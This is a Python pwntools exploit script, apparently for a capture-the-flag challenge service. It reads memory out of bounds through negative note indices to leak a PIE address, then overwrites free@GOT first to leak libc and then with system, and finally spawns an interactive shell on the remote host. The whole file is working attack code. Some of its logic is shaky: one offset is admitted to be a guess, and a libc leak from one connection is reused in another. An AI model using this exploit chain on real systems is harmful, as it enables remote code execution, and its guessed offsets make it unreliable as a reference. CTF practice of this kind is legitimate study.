#!/usr/bin/env python3
from pwn import *
from time import sleep

# --- Setup ---
context.arch = 'amd64'
libc = ELF('./libc.so.6')

# --- Offsets from objdump/readelf ---
# These are static and won't change.
NOTES_OFFSET = 0x40a0 # `objdump -t chal | grep notes` -> .bss + 0xa0
PUTS_PLT_OFFSET = 0x1030 # `objdump -D chal | grep puts@plt`
MAIN_OFFSET = 0x11d0 # `readelf -s chal | grep main`

FREE_GOT_OFFSET = 0x4048 # `readelf -r chal | grep free`
PUTS_GOT_OFFSET = 0x4018 # `readelf -r chal | grep puts`
PRINTF_GOT_OFFSET = 0x4030 # `readelf -r chal | grep printf`


# These are the *real* offsets from a static analysis
FREE_GOT_IDX = -11 # (0x40a0 - 0x4048) / 8
PRINTF_GOT_IDX = -14 # (0x40a0 - 0x4030) / 8

# This offset is a guess based on your previous logs.
# It seems to be the pointer at notes[-7]
LEAK_PTR_OFFSET = 0x1d008 

# --- Target ---
# p = process('./chal') # Use for local debugging
HOST, PORT = 'amt.rs', 26797

# =============================================================================
#  STAGE 1: LEAK LIBC
# =============================================================================
def get_libc_leak():
    log.info("--- STAGE 1: LEAKING LIBC ---")
    p = remote(HOST, PORT)

    # --- Step 1: Scan for and find PIE Base ---
    log.info("Scanning for PIE base...")
    pie_base = 0
    
    # We will scan for a PIE leak
    for i in range(-1, -20, -1):
        p.sendlineafter(b"which operation: ", b"3") # view note
        p.sendlineafter(b"which note: ", str(i).encode())
        p.recvuntil(b"data: ")
        data = p.recvline().strip()
        
        if not data or data == b"(null)":
            continue
            
        data_for_unpack = data.ljust(8, b"\x00")[:8]
        leak_val = u64(data_for_unpack)
        
        # Check if it looks like a PIE address
        if (leak_val & 0xff0000000000) in [0x550000000000, 0x560000000000]:
            log.success(f"Found PIE leak at index {i}: {hex(leak_val)}")
            # We must find the *real* offset of this leak.
            # Your log showed 0x...a008 at index -7.
            # Let's assume the leak at -7 IS 0x1d008
            if i == -7:
                pie_base = leak_val - LEAK_PTR_OFFSET 
                log.success(f"Calculated PIE Base: {hex(pie_base)}")
                break
            else:
                log.warn(f"Found PIE leak at new index {i}, offset may be wrong.")
                # Fallback, just in case
                pie_base = leak_val - LEAK_PTR_OFFSET
                break

    if pie_base == 0:
        log.error("Could not find a PIE leak. Aborting.")
        p.close()
        return None

    # --- Step 2: Calculate REAL Addresses for Leaking ---
    # We add `& 0xFFFFFFFFFFFFFFFF` to ensure the value is a 64-bit unsigned int
    PUTS_PLT_ADDR = (pie_base + PUTS_PLT_OFFSET) & 0xFFFFFFFFFFFFFFFF
    PUTS_GOT_ADDR = (pie_base + PUTS_GOT_OFFSET) & 0xFFFFFFFFFFFFFFFF
    
    # --- Step 3: Set up notes[0] to point to puts@GOT ---
    log.info("Setting notes[0] to point to puts@GOT (for leak)")
    p.sendlineafter(b"which operation: ", b"1")
    p.sendlineafter(b"which note: ", b"0")
    p.sendlineafter(b"size: ", b"8") # Just send 8 bytes
    p.sendafter(b"data: ", p64(PUTS_GOT_ADDR)) # Don't add a newline

    # --- Step 4: Overwrite free@GOT with puts@PLT (for leak) ---
    log.info(f"Overwriting free@GOT (at index {FREE_GOT_IDX}) with puts@PLT")
    p.sendlineafter(b"which operation: ", b"1")
    p.sendlineafter(b"which note: ", str(FREE_GOT_IDX).encode())
    p.sendlineafter(b"size: ", b"8")
    p.sendafter(b"data: ", p64(PUTS_PLT_ADDR))
    # Malloc/printf are now broken. We can only call delete.

    # --- Step 6: Trigger the Leak ---
    log.info("Calling delete(notes[0]) to trigger puts(puts@GOT)")
    # --- THE FIX ---
    # Send both commands in one packet to win the race.
    p.send(b"2\n0\n")
    
    # The program will now leak, then crash.
    # We will try to read the line *before* the EOFError.
    try:
        # puts() should give us 6 bytes + a newline
        data = p.recvline() 
        
        if not data:
            log.error("Received no data. Leak failed.")
            p.close()
            return None
            
        # We pad the 6 bytes to 8 (ljust) to unpack as a 64-bit int
        leaked_puts_addr = u64(data.strip().ljust(8, b"\x00"))
        log.success(f"Leaked REAL puts address: {hex(leaked_puts_addr)}")
        p.close()
        return leaked_puts_addr
    except Exception as e:
        log.error(f"Failed to leak: {e}")
        p.close()
        return None

# =============================================================================
#  STAGE 2: PWN FOR SHELL
# =============================================================================
def get_shell(leaked_puts_addr):
    log.info("--- STAGE 2: GETTING SHELL ---")
    
    # --- Step 1: Calculate Libc Addresses ---
    try:
        libc.address = leaked_puts_addr - libc.symbols['puts']
    except Exception as e:
        log.error("Failed to set libc base. Is the 'libc.so.6' file correct?")
        return
        
    system_addr = libc.symbols['system']
    log.success(f"Libc Base: {hex(libc.address)}")
    log.success(f"System Address: {hex(system_addr)}")

    # --- Step 2: Connect again and get PIE base ---
    p = remote(HOST, PORT)
    log.info("Finding PIE base again...")
    pie_base = 0
    # Scan for PIE leak again
    for i in range(-1, -20, -1):
        p.sendlineafter(b"which operation: ", b"3") # view note
        p.sendlineafter(b"which note: ", str(i).encode())
        p.recvuntil(b"data: ")
        data = p.recvline().strip()
        if not data or data == b"(null)":
            continue
        data_for_unpack = data.ljust(8, b"\x00")[:8]
        leak_val = u64(data_for_unpack)
        if (leak_val & 0xff0000000000) in [0x550000000000, 0x560000000000]:
            if i == -7:
                pie_base = leak_val - LEAK_PTR_OFFSET
                log.success(f"PIE Base: {hex(pie_base)}")
                break
    
    if pie_base == 0:
        log.error("Could not find PIE leak on 2nd attempt. Aborting.")
        p.close()
        return
            
    # --- Step 3: Set up notes[0] to contain "/bin/sh" ---
    log.info("Setting notes[0] to contain '/bin/sh'")
    p.sendlineafter(b"which operation: ", b"1")
    p.sendlineafter(b"which note: ", b"0")
    p.sendlineafter(b"size: ", b"8") # 8 bytes is enough
    p.sendafter(b"data: ", b"/bin/sh\x00") # 8 bytes: /bin/sh + null

    # --- Step 4: Overwrite free@GOT with system ---
    log.info(f"Overwriting free@GOT (at index {FREE_GOT_IDX}) with system")
    p.sendlineafter(b"which operation: ", b"1")
    p.sendlineafter(b"which note: ", str(FREE_GOT_IDX).encode())
    p.sendlineafter(b"size: ", b"8")
    p.sendafter(b"data: ", p64(system_addr))
    # Malloc/printf are now broken. We can only call delete.

    # --- Step 5: Trigger Shell ---
    log.info("Calling delete(notes[0]) to trigger system('/bin/sh')")
    # --- Send both commands in one packet ---
    p.send(b"2\n0\n")
    
    log.success("PWNED! Enjoy the shell.")
    p.interactive()

# --- Run the exploit ---
if __name__ == "__main__":
    libc_leak = get_libc_leak()
    if libc_leak:
        get_shell(libc_leak)
